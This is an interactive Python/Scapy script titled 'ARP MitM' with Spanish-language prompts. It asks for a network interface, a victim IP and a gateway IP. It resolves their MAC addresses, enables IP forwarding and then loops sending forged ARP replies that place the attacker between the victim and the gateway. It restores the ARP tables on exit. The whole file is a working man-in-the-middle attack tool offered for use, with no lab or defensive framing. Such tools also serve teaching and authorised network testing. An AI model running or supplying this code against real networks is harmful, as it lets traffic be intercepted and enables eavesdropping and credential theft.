#!/usr/bin/env python3

#########################################################
# Ataque:  ARP MitM
# Autor:   Luiggy Encarnacion
#########################################################

from scapy.all import *
import time
import os
import sys

# ─────────────────────────────────────────
def banner(title):
    width = 40
    print()
    print("  ╔" + "═" * width + "╗")
    print("  ║" + title.center(width) + "║")
    print("  ╚" + "═" * width + "╝")

def separator():
    print("  " + "─" * 42)

# ─────────────────────────────────────────
def select_interface():
    try:
        from scapy.all import get_if_list
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        iface = input("  Ingrese el nombre de la interfaz manualmente: ").strip()
        return iface

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango. Intente de nuevo.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida. Intente de nuevo.")

def solicitar_parametros():
    banner("ARP MitM Attack")
    print()

    try:
        iface      = select_interface()
        print()
        victim_ip  = input("  Ingrese la IP de la víctima   : ").strip()
        gateway_ip = input("  Ingrese la IP del gateway     : ").strip()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    return iface, victim_ip, gateway_ip

# ─────────────────────────────────────────
def get_mac(ip, iface):
    arp_req  = ARP(pdst=ip)
    bcast    = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(bcast / arp_req, iface=iface,
                      timeout=3, verbose=False, retry=2)
    if answered:
        return answered[0][1].hwsrc
    return None

def poison(target_ip, spoof_ip, target_mac, attacker_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac
    )
    sendp(pkt, iface=iface, verbose=False)

def restore(dest_ip, src_ip, iface):
    dest_mac = get_mac(dest_ip, iface)
    src_mac  = get_mac(src_ip, iface)
    if dest_mac and src_mac:
        pkt = Ether(dst=dest_mac) / ARP(
            op=2,
            pdst=dest_ip,
            hwdst=dest_mac,
            psrc=src_ip,
            hwsrc=src_mac
        )
        sendp(pkt, iface=iface, count=5, verbose=False)

# ─────────────────────────────────────────
def mitm():
    IFACE, VICTIM_IP, GATEWAY_IP = solicitar_parametros()
    ATTACKER_MAC = get_if_hwaddr(IFACE)

    banner("ARP MitM Attack")
    print(f"  Interfaz  : {IFACE}")
    print(f"  Víctima   : {VICTIM_IP}")
    print(f"  Gateway   : {GATEWAY_IP}")
    separator()

    print("  [*] Resolviendo MACs...")
    victim_mac  = get_mac(VICTIM_IP, IFACE)
    gateway_mac = get_mac(GATEWAY_IP, IFACE)

    if not victim_mac:
        print(f"  [-] No se encontró MAC de víctima ({VICTIM_IP})")
        print(f"  [-] Verifica conectividad. Saliendo.")
        sys.exit(1)

    if not gateway_mac:
        print(f"  [-] No se encontró MAC de gateway ({GATEWAY_IP})")
        print(f"  [-] Verifica conectividad. Saliendo.")
        sys.exit(1)

    separator()
    print(f"  MAC Víctima  : {victim_mac}")
    print(f"  MAC Gateway  : {gateway_mac}")
    print(f"  MAC Atacante : {ATTACKER_MAC}")
    separator()

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("  [*] IP Forwarding habilitado")
    print("  [*] Iniciando envenenamiento ARP...")
    print()

    header = f"  {'Tiempo':^8} {'Envenenamientos':^18} {'Estado':^14}"
    print(header)
    print("  " + "─" * (len(header) - 2))

    count      = 0
    start_time = time.time()

    try:
        while True:
            poison(VICTIM_IP,  GATEWAY_IP, victim_mac,  ATTACKER_MAC, IFACE)
            poison(GATEWAY_IP, VICTIM_IP,  gateway_mac, ATTACKER_MAC, IFACE)
            count += 1

            elapsed      = int(time.time() - start_time)
            mins, secs   = divmod(elapsed, 60)
            print(f"  {mins:02d}:{secs:02d}   "
                  f"  {count:>10,}         "
                  f"  Activo ✓   ", end="\r")

            time.sleep(1.5)

    except KeyboardInterrupt:
        elapsed = max(int(time.time() - start_time), 1)
        mins, secs = divmod(elapsed, 60)

        print()
        print()
        banner("Resumen Final")
        print(f"  Envenenamientos enviados : {count:,}")
        print(f"  Tiempo activo            : {mins:02d}:{secs:02d}")
        print(f"  Paquetes ARP totales     : {count * 2:,}")
        print()
        separator()

        print("  [*] Restaurando tablas ARP...")
        restore(VICTIM_IP,  GATEWAY_IP, IFACE)
        restore(GATEWAY_IP, VICTIM_IP,  IFACE)
        print("  [+] Tablas restauradas.")
        print("  [+] Saliendo.")
        print()
        sys.exit(0)

if __name__ == "__main__":
    mitm()
